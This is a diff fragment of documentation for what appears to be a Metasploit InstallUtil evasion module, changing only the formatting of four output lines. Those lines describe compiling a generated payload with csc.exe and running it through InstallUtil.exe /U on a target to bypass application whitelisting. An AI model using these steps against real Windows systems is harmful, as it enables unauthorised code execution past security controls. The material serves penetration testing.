@@ -20,10 +20,10 @@ This evasion will work on all versions of Windows that include .NET versions 3.5
   3. Do: `set PAYLOAD <payload>`
   4. Do: `run`
   5. The module will now display instructions of how to proceed:
-     `[+] install_util.txt stored at /root/.msf4/local/install_util.txt`
-     `[*] Copy install_util.txt to the target`
-     `[*] Compile using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\csc.exe /out:installutil.exe install_util.txt` - replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
-     `[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
+     -`[+] install_util.txt stored at /root/.msf4/local/install_util.txt`
+     -`[*] Copy install_util.txt to the target`
+     -`[*] Compile using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\csc.exe /out:installutil.exe install_util.txt` - replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
+     -`[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
 
 ## References
 
